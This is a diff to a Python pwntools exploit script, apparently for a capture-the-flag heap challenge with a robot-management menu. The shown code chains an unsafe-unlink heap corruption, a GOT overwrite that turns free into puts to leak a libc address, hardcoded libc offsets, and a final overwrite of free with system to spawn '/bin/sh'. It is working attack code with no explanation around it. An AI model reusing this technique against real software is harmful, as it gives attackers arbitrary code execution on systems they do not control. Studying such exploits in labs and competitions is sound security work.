@@ -66,19 +66,35 @@ def exploit(io, pri, e):
     pri.offbyone("\x01")
     pri.delRobot(2)
     
+    pri.addRobot(2, 2)
     ptr = 0x006030f0
     payload = p64(0x0) + p64(0x20)
     payload += p64(ptr - 0x18) + p64(ptr - 0x10)
     payload += p64(0x20)
-    pri.offbyone("\x01")
+    #pri.offbyone("\x01")
     pri.editRobot(2, payload)
     pri.delRobot(4) # unsafe-unlink
     io.sla(io.MENU, str(0)) # Why need dummy here?
 
-    pri.delRobot(5)
-    payload = p64(e.got['free'])
+    pri.addRobot(4)
+    payload = p64(0x0)
+    payload += p64(e.got['free'])
     pri.editRobot(2, payload)
     pri.editRobot(4, p64(e.plt['puts']))
+    pri.editRobot(2, p64(0x0) + p64(e.got['read']))
+    pri.delRobot(4)
+
+    readOffset = 0x00000000000f7350
+    libc = u64(io.r.recvn(6).ljust(8, b'\x00')) - readOffset
+    assert libc & 0xfff == 0x0
+    log.warn("libc: 0x%lx" % libc)
+
+    pri.addRobot(4)
+    systemOffset = 0x00000000000453a0
+    pri.editRobot(2, p64(0x0) + p64(e.got['free']))
+    pri.editRobot(4, p64(libc + systemOffset))
+    pri.editRobot(5, "/bin/sh\x00")
+    pri.delRobot(5)
 
 if __name__ == "__main__":
     import argparse
